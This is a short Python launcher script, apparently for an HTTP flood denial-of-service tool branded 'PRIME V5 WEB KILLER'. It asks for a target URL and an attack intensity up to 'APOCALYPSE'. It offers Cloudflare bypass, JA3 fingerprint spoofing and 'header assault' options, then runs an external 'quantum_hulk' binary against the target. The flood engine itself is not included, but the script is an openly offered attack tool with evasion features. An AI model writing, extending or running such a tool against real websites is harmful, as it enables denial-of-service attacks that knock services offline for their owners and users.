#if u steal my code, ill beat yo ass
import os
import pyfiglet
from colorama import Fore, Style, init

os.system('cls' if os.name == 'nt' else 'clear')
init(autoreset=True)

def big_text(text, color):
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = pyfiglet.figlet_format(text, font="slant")
    print(color + banner + Style.RESET_ALL)

big_text("PRIME", Fore.RED)
print(Fore.RED + "V5 ☢︎︎ WEB KILLER\n")
print(Fore.RED + "MADE BY ELLIOT | PUBILC VERSION\n")

target = input(Fore.RED + "TARGET URL —> ").strip()
if not target:
    print(Fore.RED + "Target URL is required!")
    exit()

cf = input(Fore.RED + "Cloudflare protected? (y/N): ").strip().lower() == 'y'

print(Fore.RED + "1 - STANDARD\n2 - ULTRA\n3 - EXTREME\n4 - VERY EXTREME\n5 - APOCALYPSE\n6 - WEB KILLER\n7 - WEB KILLER PRO")
mode = input(Fore.RED + "Select mode (1-7, default 3): ").strip() or "3"

ja3 = input(Fore.RED + "Enable JA3 fingerprint spoofing? (Y/n): ").strip().lower() != 'n'
auto_net = input(Fore.RED + "Auto Network error handling? (Y/n): ").strip().lower() != 'n'
extreme_headers = input(Fore.RED + "Enable header assalut? (Y/n): ").strip().lower() != 'n'

cmd = f'./quantum_hulk ULTIMATE {target} --mode={mode}'
if cf:
    cmd += ' --cloudflare'
if ja3:
    cmd += ' --ja3'
if extreme_headers:
    cmd += ' --extreme-headers'
if not auto_net:
    cmd += ' --autonetwork=false'

os.system(cmd)
